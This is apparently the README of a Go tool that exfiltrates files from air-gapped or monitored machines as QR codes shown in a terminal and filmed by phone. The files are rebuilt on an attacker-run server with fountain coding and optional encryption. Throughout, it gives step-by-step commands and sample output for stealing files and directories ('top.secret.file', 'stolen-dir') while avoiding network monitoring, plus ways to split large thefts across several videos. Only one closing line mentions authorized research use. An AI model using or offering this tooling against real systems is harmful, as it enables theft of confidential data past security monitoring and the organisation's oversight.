# goqrexfil

Exfiltrate data as **QR codes captured on video** — a cover channel that never touches the
network.

The idea: data leaves the air-gapped (or monitored) machine by being *looked at*. A client
renders the payload as a stream of QR codes **directly in your terminal**; a phone records
them on video; the video is uploaded to a server you control, which extracts the frames,
reads every QR code, and reconstructs the original file. No packets, no USB, no network
monitoring alerts — just a video file that looks like any other.

The pipeline is protected by **RaptorQ fountain coding** (erasure coding): the client emits
more symbols than are strictly needed, so the server can reconstruct the payload even when
the video drops frames — no re-recording required in the common case.

```
              client (monitored machine)                        server (your machine)
              ──────────────────────────                        ──────────────────────
  file / dir / stdin
        │
        ▼
  [AES-GCM encrypt] ──► zstd compress ──► RaptorQ encode ──► symbol stream (k + redundancy)
                                                        │
                                          each symbol framed + rendered as a
                                          QR code in the terminal (half-blocks)
                                                        │
                                              ┌─────────▼──────────┐
                                              │  symbol #1         │   ◄── phone films
                                              │  symbol #2         │       the terminal
                                              │  ...               │
                                              └─────────┬──────────┘
                                                        │  video upload (http/https)
                                                        ▼
                                     ffmpeg frame extraction ──► QR recognition (gozxing
                                                        │        multi-scale + goqr fallback)
                                          RaptorQ decode (any solvable subset, per job)
                                                        │
                                              zstd decompress ──► [AES-GCM decrypt]
                                                        │
                                                        ▼
                                                  payload/jobs/<job>/  ✓
```

## Requirements

* [Go](https://go.dev) 1.26+
* [ffmpeg](https://ffmpeg.org) on `PATH` (server mode only)
* A phone and a steady hand (client mode)
* A terminal with a **monospace font** — QR codes are drawn with Unicode half-blocks
  (`█▀▄`), so no browser is needed

## Build

```sh
go build -o goqrexfil .
```

## Quick start

**1. Start the server** on a machine you control:

```sh
./goqrexfil --server                 # http://<server>:9999
./goqrexfil --server --token SECRET  # require a shared token
./goqrexfil --server --key PASSPHRASE  # decrypt encrypted payloads
./goqrexfil --server --tls           # HTTPS with a self-signed cert (fingerprint printed)
```

**2. Record the QR stream** on the monitored machine. Point your phone at the terminal
(zoom so the QR fills most of the frame). A warm-up pattern is shown first so the phone's
auto-focus and exposure lock, then the stream starts:

```sh
cat top.secret.file | ./goqrexfil --client
[*] Client mode: ON
[*] Source: stdin (8.2 KiB)
Plaintext hash 9f2c...
Verification code K7PD-4MQX
[*] 38 base symbols, 57 total (redundancy 50%, mode z)
[*] This video: symbols 1-57 (57 of 57)
[*] Estimated recording time: ~31s
[***] Point your phone at this terminal; the stream starts in > 3 < seconds ****
```

**3. Upload the video** from your phone to `http://<server>:9999/` (add `?token=SECRET`
if you set one) and submit. The server reconstructs as soon as it has enough symbols and
responds with a download link and a verification code:

```
[*] File received (job: default)
[*] received 25 symbols (need ~38)
[*] Payload reconstructed from 41 symbols (need ~38)
[*] Payload saved as  payload/jobs/default/payload.bin
Payload hash 9f2c...
Verification code K7PD-4MQX
```

Compare the **verification code** from step 2 with the one from step 3 — they must match
(a short human-readable check, e.g. `K7PD-4MQX`, instead of comparing long hex hashes by
eye). Then download the file from `http://<server>:9999/payload`.

## Why it's reliable: fountain coding

Each QR code is a **RaptorQ symbol**, not a fixed chunk. The client emits `k` base symbols
plus a redundancy pool (default 50%), and the server can reconstruct the payload from
**any** solvable subset of the symbols it captured. That means:

* Dropped frames, motion blur, and missed QRs are absorbed by the redundancy — a typical
  recording reconstructs on the first try.
* The server shows live progress (`received N symbols (need ~k)`) and **stops scanning as
  soon as the payload is decodable**, instead of processing the whole video.
* If a recording genuinely captured too little, the server tells you — just re-record.
  Because it's a fountain code, *any* additional symbols help, so there's no "re-record
  chunks 4, 8, 12" bookkeeping.

Tune the trade-off with `--redundancy` (percent of base symbols): higher = longer video but
more tolerant of a bad recording.

```sh
./goqrexfil --client --redundancy 100 top.secret.file   # very robust, ~2x longer
```

## Large transfers: split across multiple videos

A single recording has a practical length limit, but a big payload can span **several
videos**. Because RaptorQ symbols are addressable, the server keeps a **job** and
accumulates symbols across every upload to that job — it decodes as soon as the *union* of
all uploaded videos is a solvable subset.

Split the stream with `--start` (first symbol, 1-based) and `--count` (how many):

```sh
./goqrexfil --client --job big --start 1   --count 20000 ./huge-dir   # video 1
./goqrexfil --client --job big --start 20001 --count 20000 ./huge-dir # video 2
./goqrexfil --client --job big --start 40001 ./huge-dir               # video 3 (to the end)
```

Upload each video to the same job (`job=big` in the form, or `?job=big`). After each upload
the server reports progress — `Job big in progress: 12345 symbols (need ~26000)` — and
completes once enough have arrived. `GET /jobs` lists every job and its status.

## Directory and multi-file exfiltration

Point the client at a directory and it packs everything into a tar.gz with a SHA-256
manifest; the server unpacks it to `payload/jobs/<job>/extracted/` and verifies every file
against the manifest:

```sh
./goqrexfil --client ./stolen-dir
[*] Source: stolen-dir (1.2 MiB)
[*] 5120 base symbols, 7680 total (redundancy 50%)
[*] Estimated recording time: ~4224s
```

A single file works the same way: `./goqrexfil --client ./top.secret.pdf`.

**Preview before you record** with `--dry-run` (shows size, symbol count, and time
estimate, displays nothing):

```sh
./goqrexfil --client --dry-run ./stolen-dir
```

## Encryption

By default the payload is only obfuscated, not protected — anyone who intercepts the video
can read it. Add `--key` on **both** ends to encrypt the payload with AES-256-GCM before it
ever becomes QR codes. The key never crosses the channel; the server needs the same
passphrase to decrypt:

```sh
# client
./goqrexfil --client --key "correct horse battery staple" ./top.secret.pdf
# server
./goqrexfil --server --key "correct horse battery staple"
```

The key is turned into a 256-bit key via SHA-256. If the server is given the wrong (or no)
key, decryption fails and no payload is produced.

## Self-test (no camera needed)

Verify the whole encode → QR → decode → RaptorQ-reconstruct pipeline locally. It simulates
an 80% capture and confirms the payload still reconstructs:

```sh
cat top.secret.file | ./goqrexfil --selftest
[*] 26 base symbols, 39 total (mode z)
[*] PASS: round-trip OK from 80% of symbols, verification code K7PD-4MQX
```

Add `--key` to also exercise the encryption path.

## Robust QR decoding

Each extracted frame is decoded by a **ladder**: gozxing (a strong, maintained reader) at
native, 2×, and 0.5× scale, then the legacy goqr reader as a fallback. The first success
wins. This makes recognition far more tolerant of compression artifacts, blur, and slight
scaling than a single reader at one scale.

The repo ships end-to-end tests (`goqrexfil_test.go`) that build a real mp4 from QR frames
and run the full server pipeline — including tests that **drop 25% of the symbols and still
reconstruct the payload**, **split one payload across two video uploads (job assembly)**,
and **round-trip an encrypted payload**:

```sh
go test ./...
```

## Reference

### Flags

| Flag | Description |
| --- | --- |
| `--client [path]` | Read payload from `path` (file or directory) or stdin, display QR stream |
| `--client --dry-run` | Show symbol count + time estimate, display nothing |
| `--client --redundancy N` | RaptorQ redundancy as % of base symbols (default 50) |
| `--client --key PASSPHRASE` | Encrypt the payload with AES-256-GCM |
| `--client --job NAME` | Job name (matches the server job for multi-video assembly) |
| `--client --start N` | First symbol to display (1-based), to split a transfer across videos |
| `--client --count N` | Number of symbols to display (0 = to the end) |
| `--client --no-quiet-zone` | Omit the QR quiet zone to save 8 columns (narrow terminals) |
| `--client --no-warmup` | Skip the warm-up focus/exposure pattern |
| `--server` | Web server on port 9999: upload video, reconstruct payload |
| `--server --token SECRET` | Require the shared token on upload/download |
| `--server --key PASSPHRASE` | Decrypt encrypted payloads |
| `--server --tls` | Serve over TLS (self-signed cert, fingerprint printed) |
| `--server --tls-cert C --tls-key K` | Use your own TLS cert/key |
| `--selftest [path]` | Local round-trip test of the QR pipeline, no camera needed |
| `--retrievePayload --job NAME` | Re-process `./public/video.mp4` without the web server (debug) |

### Server endpoints

| Endpoint | Description |
| --- | --- |
| `GET /` | Upload form (add `?token=…` if a token is set) |
| `POST /upload` | Upload a video (multipart `file`, max 512 MB; `job` field selects the job); returns download link, progress, or a "re-record" notice |
| `GET /payload?job=NAME` | Download the reconstructed payload for a job |
| `GET /jobs` | List all jobs and their status (received/needed symbols, verification code) |
| `GET /process/` | Static access to extracted frames (debugging) |

### The symbol protocol

Each QR code encodes `GQ3:<mode>:<blobLen>:<symbolID>:<base64(symbol)>` where `<mode>` is
`z` (zstd-compressed) or `ze` (zstd-compressed then AES-GCM encrypted), `<blobLen>` is the
exact byte length of that blob (the RaptorQ decoder needs it), `<symbolID>` indexes the
fountain symbol, and `<base64(symbol)>` is a ~240-byte RaptorQ symbol. The `:` separators
cannot appear in base64, so framing is unambiguous.

## Throughput

Each QR carries a 240-byte symbol held for 550 ms, and 50% redundancy means you emit 1.5
symbols per base symbol. RaptorQ pads the symbol count, so treat these as **approximate
worst-case** (incompressible data) figures — run `--dry-run` for the exact count and time
for your payload:

| Original size | Total symbols (approx) | Recording time (approx) |
| --- | --- | --- |
| 1 KB | ~9 | ~5 s |
| 10 KB | ~77 | ~42 s |
| 100 KB | ~770 | ~7 min |
| 1 MB | ~7,900 | ~70 min |
| 10 MB | ~79,000 | ~12 h |

Compressible payloads (text, PDFs, source) shrink under zstd and transfer proportionally
faster. Lower `--redundancy` shortens the video at the cost of less tolerance for a bad
recording.

## Tuning

Constants at the top of `goqrexfil.go`:

* `symbolSize` — bytes per RaptorQ symbol (240 → ~320 base64 chars per QR). Changing it
  alters QR density; run `--selftest` after changing it.
* `msBetweenFrames` — dwell time per symbol (550 ms). Raise it if your phone drops frames.
* `ffmpegImageScale` — frames are extracted at native resolution, capped at 1600 px wide
  for 4K video. Never downscale below ~600 px: QR recognition fails below that.

## Limitations

* The server is plain HTTP by default with no authentication — use `--token` and/or `--tls`
  before pointing it at anything but a trusted network, and stop it when done.
* Recognition quality depends on the recording: steady hand, good lighting, QR filling the
  frame, monospace terminal font. Fountain coding absorbs some loss, but a very bad
  recording may still need a re-take.
* This is a research/education project about cover channels. Use it only on systems you own
  or are authorized to test.

## License

See [LICENSE](LICENSE).
